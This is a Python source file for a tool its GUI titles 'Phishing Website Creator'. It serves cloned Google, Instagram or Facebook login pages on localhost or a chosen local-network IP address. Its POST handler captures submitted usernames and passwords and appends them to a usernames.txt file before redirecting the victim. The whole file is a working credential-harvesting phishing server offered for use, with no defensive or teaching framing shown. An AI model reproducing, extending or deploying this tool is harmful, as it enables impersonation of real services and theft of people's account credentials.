import os
import re

from http.server import HTTPServer, SimpleHTTPRequestHandler
import time
from os import curdir, sep

sites = ["Google", "Instagram", "Facebook"]
page_folder = "pages"

REDIRECT = ["/", "/index.php", "/index.html", "/login.html", "/login.php"]
SITE = ""

# ----- SERVER -----
class MyServer(SimpleHTTPRequestHandler):
    def do_GET(self):
        files = os.listdir("pages/" + SITE)

        if self.path in REDIRECT:
            self.send_response(200)
            self.path = "/pages/" + SITE + "/login.html"
        elif self.path[1:] in files:
            self.send_response(200)
            self.path = "/pages/" + SITE + self.path
        elif self.path.startswith("/error/"):
            self.send_response(400)
        else:
            self.send_response(400)
            self.path = "/error/error.html"

        try:
			#Check the file extension required and
			#set the right mime type

            sendReply = False
            if self.path.endswith(".html"):
                mimetype='text/html'
                sendReply = True
            if self.path.endswith(".jpg"):
                mimetype='image/jpg'
                sendReply = True
            if self.path.endswith(".gif"):
                mimetype='image/gif'
                sendReply = True
            if self.path.endswith(".js"):
                mimetype='application/javascript'
                sendReply = True
            if self.path.endswith(".css"):
                mimetype='text/css'
                sendReply = True
            if self.path.endswith(".png"):
                mimetype='image/png'
                sendReply = True

            if sendReply == True:
                #Open the static file requested and send it
                with open(curdir + sep + self.path, 'rb') as f:
                    self.send_header('Content-type', mimetype)
                    self.end_headers()
                    self.wfile.write(f.read())

            return
        
        except IOError:
            self.send_error(404)

    def do_POST(self):
        if self.path in ["/login.php", "/pages/" + SITE + "/login.php"]:
            self.path = "/pages/" + SITE + "/login.php"

            content_length = int(self.headers.get('Content-Length', 0)) # <--- Gets the size of data
            post_data = self.rfile.read(content_length) # <--- Gets the data itself
            creds = post_data.decode('utf-8').replace('&', ', ')
            creds += '\n'

            with open(curdir + sep + "/usernames.txt", 'a') as f:
                f.write(creds)

            self.path = "/"
            self.do_GET()

        else:
            return

    def send_error(self, code, message=None):
        if code == 404:
            self.path = "/none"
            return self.do_GET()


def start(site, hostName = "localhost", serverPort = 8080):
    try:
        global SITE
        SITE = site

        webServer = HTTPServer((hostName, serverPort), MyServer)
        print("\nServer started http://%s:%s" % (hostName, serverPort))

        try:
            webServer.serve_forever()
        except KeyboardInterrupt:
            pass

        webServer.server_close()
        print("Server stopped.")

    except OSError:
        print("\nError! The server could not be bound to the address provided.")

# ----------

# ====================
# GUI code starts here
# ====================

import PySimpleGUI as sg

sg.LOOK_AND_FEEL_TABLE['DarkMode'] = {  'BACKGROUND': '#121212',
                                        'TEXT': '#E0E0E0',
                                        'INPUT': '#1C1C1E',
                                        'TEXT_INPUT': '#FFFFFF',
                                        'SCROLL': '#32D74B',
                                        'BUTTON': ('#E0E0E0', '#32D74B'),
                                        'PROGRESS': ('#32D74B', '#333333'),
                                        'BORDER': 0,
                                        'SLIDER_DEPTH': 0,
                                        'PROGRESS_DEPTH': 0
                                    }

sg.theme('DarkMode')
sg.SetOptions(element_padding=(8,8))

def MAKE_PWC():

    layout = [  [sg.Text("Sites: ", font='Any 26', text_color='#E0E0E0'),
                    sg.Combo(sites, default_value=sites[0], font='Any 24', key="-SITE-", readonly=True)],
                
                [sg.Text("Host: ", font='Any 26', text_color='#E0E0E0', key='-IN1 TEXT-'),
                    sg.pin(sg.Column([ [ sg.InputText(font='Any 24', text_color='#E0E0E0', key='-IN2-', focus=True)] ], key='-IP-', visible=False)),
                    sg.Combo(['Localhost', 'Local Network'], default_value='Localhost', font='Any 24', enable_events=True, key="-HOST-", readonly=True)],

                [sg.Button('Start', font='Any 24', key="-START-", bind_return_key=True),
                    sg.Button('Close', font='Any 24', button_color=('#E0E0E0','#9F9FA5'))],
                [sg.Multiline("", disabled=True, write_only=True, autoscroll=True, size=(1240, 30), text_color='#E0E0E0', font='Any 12', key="-OUTPUT-"+sg.WRITE_ONLY_KEY)] ]

    return sg.Window('Phishing Website Creator', layout, size=(1280,720), finalize=True)

def CHECK_PWC(window, event, values):

    original_path = os.getcwd()

    # Route working directory to the python file
    main_path = os.path.dirname(os.path.realpath(__file__))
    os.chdir(main_path)

    if event == sg.WIN_CLOSED or event == 'Close':
        window.close()

    elif event.startswith('-HOST-'):
        combo = values['-HOST-']

        if combo == 'Localhost':
            window['-IP-'].update(visible=False)
        else:
            window['-IP-'].update(visible=True)

    elif event.startswith('-START-'):
        if values['-HOST-'] == 'Localhost':
            start(values['-SITE-'])
        else:
            ip_addr = values['-IP-']

            if (re.search(r'^\b(?:(?:2(?:[0-4][0-9]|5[0-5])|[0-1]?[0-9]?[0-9])\.){3}(?:(?:2([0-4][0-9]|5[0-5])|[0-1]?[0-9]?[0-9]))\b$', ip_addr) == None):
                window['-OUTPUT-'+sg.WRITE_ONLY_KEY].print("Oops! That does not resemble an IP address. Switching to localhost...")
                start(values['-SITE-'])
            else:
                start(values['-SITE-'], ip_addr)

    os.chdir(original_path)